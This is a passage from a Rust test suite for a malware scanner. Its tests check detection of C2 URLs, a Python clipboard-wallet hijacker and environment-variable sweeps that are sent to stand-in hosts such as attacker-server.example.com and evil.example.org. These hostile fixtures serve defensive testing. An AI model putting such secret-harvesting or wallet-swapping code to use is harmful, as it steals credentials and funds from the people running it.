        let content = "const c2 = 'https://cjn37-uyaaa-aaaac-qgnva-cai.raw.icp0.io/payload';";
        let findings = scan_single("payload.js", content, FileKind::Javascript);
        // Both IOC_ICP_CANISTER and IOC_CANISTERSPRAWL should fire.
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id.as_deref() == Some("IOC_CANISTERSPRAWL")),
            "CanisterSprawl-specific canister URL must fire IOC_CANISTERSPRAWL (IOC-11)"
        );
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id.as_deref() == Some("IOC_ICP_CANISTER")),
            "CanisterSprawl canister URL must also fire IOC_ICP_CANISTER (IOC-01)"
        );
    }

    #[test]
    fn ioc12_eth_contract_c2_detected() {
        let content =
            "const C2 = '0xa1b40044EBc2794f207D45143Bd82a1B86156c6b'; getString(C2, 'cfg');";
        let findings = scan_single("loader.js", content, FileKind::Javascript);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id.as_deref() == Some("IOC_ETH_CONTRACT_C2")),
            "Ethereum C2 contract address must be detected (IOC-12)"
        );
        let f = findings
            .iter()
            .find(|f| f.rule_id.as_deref() == Some("IOC_ETH_CONTRACT_C2"))
            .unwrap();
        assert_eq!(f.severity, Severity::Critical);
    }

    // -----------------------------------------------------------------------
    // GAP-C: pyperclip clipboard-hijack detection
    // -----------------------------------------------------------------------

    #[test]
    fn gap_c_pyperclip_paste_with_wallet_detected() {
        // Python clipboard stealer: read clipboard, check if it looks like a wallet,
        // replace with attacker wallet.
        let content = r#"
import pyperclip
addr = pyperclip.paste()
if looks_like_wallet(addr):
    pyperclip.copy('1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2')
"#;
        let findings = scan_single("stealer.py", content, FileKind::Python);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id.as_deref() == Some("IOC_CLIPBOARD_HIJACK")),
            "pyperclip.paste() near wallet address must fire IOC_CLIPBOARD_HIJACK (GAP-C)"
        );
        let f = findings
            .iter()
            .find(|f| f.rule_id.as_deref() == Some("IOC_CLIPBOARD_HIJACK"))
            .unwrap();
        assert_eq!(f.severity, Severity::Critical);
        assert_eq!(f.category, ThreatCategory::CryptoStealer);
    }

    #[test]
    fn gap_c_pyperclip_copy_alone_no_wallet_no_finding() {
        // pyperclip.copy with no wallet-like string nearby — should NOT fire.
        let content = "import pyperclip\npyperclip.copy('hello world')";
        let findings = scan_single("utils.py", content, FileKind::Python);
        assert!(
            findings
                .iter()
                .all(|f| f.rule_id.as_deref() != Some("IOC_CLIPBOARD_HIJACK")),
            "pyperclip.copy with non-wallet string must not fire IOC_CLIPBOARD_HIJACK"
        );
    }

    // -----------------------------------------------------------------------
    // FP2: sponsorship / funding URLs must not be flagged
    // -----------------------------------------------------------------------

    #[test]
    fn fp2_opencollective_url_not_flagged() {
        let content = "Please support us at https://opencollective.com/myproject";
        let findings = scan_single("README.md", content, FileKind::Text);
        let concerning: Vec<_> = findings
            .iter()
            .filter(|f| {
                f.severity >= Severity::Medium || f.category == ThreatCategory::Exfiltration
            })
            .collect();
        assert!(
            concerning.is_empty(),
            "opencollective.com URL must not produce Medium+/Exfil findings: {concerning:?}"
        );
    }

    #[test]
    fn fp2_sponsors_github_url_not_flagged() {
        let content = r#"{ "funding": { "github": "https://sponsors.github.com/myuser" } }"#;
        let findings = scan_single("package.json", content, FileKind::Json);
        let concerning: Vec<_> = findings
            .iter()
            .filter(|f| {
                f.severity >= Severity::Medium || f.category == ThreatCategory::Exfiltration
            })
            .collect();
        assert!(
            concerning.is_empty(),
            "sponsors.github.com URL must not produce Medium+/Exfil findings: {concerning:?}"
        );
    }

    #[test]
    fn fp2_liberapay_url_not_flagged() {
        let content = "Donate: https://liberapay.com/myuser";
        let findings = scan_single("README.txt", content, FileKind::Text);
        let concerning: Vec<_> = findings
            .iter()
            .filter(|f| f.severity >= Severity::Medium)
            .collect();
        assert!(
            concerning.is_empty(),
            "liberapay.com URL must not produce Medium+ findings: {concerning:?}"
        );
    }

    #[test]
    fn fp2_patreon_url_not_flagged() {
        let content = "https://www.patreon.com/myproject: become a patron!";
        let findings = scan_single("FUNDING.md", content, FileKind::Text);
        let concerning: Vec<_> = findings
            .iter()
            .filter(|f| f.severity >= Severity::Medium)
            .collect();
        assert!(
            concerning.is_empty(),
            "patreon.com URL must not produce Medium+ findings: {concerning:?}"
        );
    }

    // -----------------------------------------------------------------------
    // FP6: plain process.env.VAR read must NOT elevate URLs to Exfiltration;
    //      only Object.keys/values/entries(process.env) must trigger elevation.
    // -----------------------------------------------------------------------

    /// A legitimate SDK pattern: read one env var, call the SDK's own API URL.
    /// This must NOT be elevated to Exfiltration (old bug: any process.env ref
    /// caused elevation).
    #[test]
    fn fp6_plain_sdk_env_read_no_exfil_elevation() {
        let content = r#"
const apiKey = process.env.OPENAI_API_KEY;
const response = await fetch('https://api.openai.com/v1/chat/completions', {
    headers: { 'Authorization': 'Bearer ' + apiKey },
    body: JSON.stringify({ model: 'gpt-4', messages }),
});
"#;
        // File is not an install script and has no env enumeration — should
        // produce at most a Low IOC_URL finding, never Exfiltration.
        let findings = scan_single("src/llm.js", content, FileKind::Javascript);
        let exfil_findings: Vec<_> = findings
            .iter()
            .filter(|f| f.category == ThreatCategory::Exfiltration)
            .collect();
        assert!(
            exfil_findings.is_empty(),
            "plain process.env.API_KEY read + legitimate API URL must NOT produce \
Exfiltration findings (FP6): {exfil_findings:?}"
        );
    }

    /// A plain process.env.VAR read in a normal (non-install) file must also
    /// not elevate an otherwise-innocent URL to IOC_URL_INSTALL_SCRIPT.
    #[test]
    fn fp6_plain_env_read_does_not_elevate_suspicious_server_url() {
        // The URL is not in the benign list; without elevation it is Low/IOC.
        // With the old bug (any process.env hit) it would be Medium/Exfiltration.
        let content =
            "const k = process.env.MY_KEY;\nfetch('https://my-custom-service.example.com/api')";
        let findings = scan_single("src/client.js", content, FileKind::Javascript);
        let exfil: Vec<_> = findings
            .iter()
            .filter(|f| f.rule_id.as_deref() == Some("IOC_URL_INSTALL_SCRIPT"))
            .collect();
        assert!(
            exfil.is_empty(),
            "plain process.env.VAR read must not elevate URL to IOC_URL_INSTALL_SCRIPT (FP6): \
{exfil:?}"
        );
    }

    /// Object.keys(process.env) IS a full env sweep — must still elevate.
    #[test]
    fn fp6_env_enumeration_still_elevates() {
        let content = r#"
const allVars = Object.keys(process.env);
const secrets = allVars.filter(k => /TOKEN|KEY|SECRET/.test(k));
fetch('https://attacker-server.example.com/harvest', { body: JSON.stringify(secrets) });
"#;
        let findings = scan_single("src/sweep.js", content, FileKind::Javascript);
        let exfil: Vec<_> = findings
            .iter()
            .filter(|f| f.rule_id.as_deref() == Some("IOC_URL_INSTALL_SCRIPT"))
            .collect();
        assert!(
            !exfil.is_empty(),
            "Object.keys(process.env) must still elevate URL to IOC_URL_INSTALL_SCRIPT (FP6)"
        );
        assert_eq!(exfil[0].severity, Severity::Medium);
        assert_eq!(exfil[0].category, ThreatCategory::Exfiltration);
    }

    /// Object.values(process.env) variant must also elevate.
    #[test]
    fn fp6_object_values_process_env_elevates() {
        let content = "const vals = Object.values(process.env);\nfetch('https://evil.example.org/dump', { body: vals });";
        let findings = scan_single("src/dump.js", content, FileKind::Javascript);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id.as_deref() == Some("IOC_URL_INSTALL_SCRIPT")),
            "Object.values(process.env) must elevate URL (FP6)"
        );
    }

    /// JSON.stringify(process.env) variant must also elevate.
    #[test]
    fn fp6_json_stringify_process_env_elevates() {
        let content = "axios.post('https://collector.bad-actor.io', JSON.stringify(process.env));";
        let findings = scan_single("src/telemetry.js", content, FileKind::Javascript);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id.as_deref() == Some("IOC_URL_INSTALL_SCRIPT")),
            "JSON.stringify(process.env) must elevate URL (FP6)"
        );
    }

    // -----------------------------------------------------------------------
    // Updated test — env enumeration (replaces old "process.env elevates URL"
    // test which fired on any process.env.VAR read; now uses Object.keys).
    // -----------------------------------------------------------------------

    /// The original test is preserved with a renamed function that uses an
    /// actual environment enumeration call to trigger elevation.
    #[test]
    fn env_enumeration_elevates_url_severity() {
        let content = "const keys = Object.keys(process.env);\nfetch('https://attacker-server.io/steal?k=' + keys.join(','));";
        let findings = scan_single("index.js", content, FileKind::Javascript);
        let url_findings: Vec<_> = findings
            .iter()
            .filter(|f| f.rule_id.as_deref() == Some("IOC_URL_INSTALL_SCRIPT"))
            .collect();
        assert!(
            !url_findings.is_empty(),
            "URL near Object.keys(process.env) must be elevated to IOC_URL_INSTALL_SCRIPT"
        );
    }

    // TRUE-POSITIVE (pad-before-payload): a known exfil endpoint placed AFTER
    // >8 MiB of benign filler must still be detected via the TAIL window — a
    // head-only truncation would drop it and scan Clean.
    #[test]
    fn oversized_pad_before_payload_ioc_detected_in_tail() {
        let mut content = String::with_capacity(9 * 1024 * 1024);
        content.push_str("// benign header\n");
        content.push_str(&"const filler = 1;\n".repeat(9 * 1024 * 1024 / 18));
        content.push_str(
            "\nconst HOOK = 'https://discord.com/api/webhooks/1234567890/abcdefghijklmnop';\n",
        );
        assert!(content.len() > 8 * 1024 * 1024, "fixture must exceed cap");
        let findings = scan_single("scripts/postinstall.js", &content, FileKind::Javascript);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id.as_deref() == Some("IOC_EXFIL_ENDPOINT")),
            "exfil endpoint after >8 MiB filler must be detected in the tail window"
        );
    }

    // TRUE-NEGATIVE: a large but wholly benign file must not produce findings.
    #[test]
    fn oversized_benign_file_no_findings() {
        let content = "const filler = 1;\n".repeat(9 * 1024 * 1024 / 18);
        assert!(content.len() > 8 * 1024 * 1024);
        let findings = scan_single("big.js", &content, FileKind::Javascript);
        assert!(
            findings.is_empty(),
            "benign oversized file must not fire; got: {findings:?}"
        );
    }
}
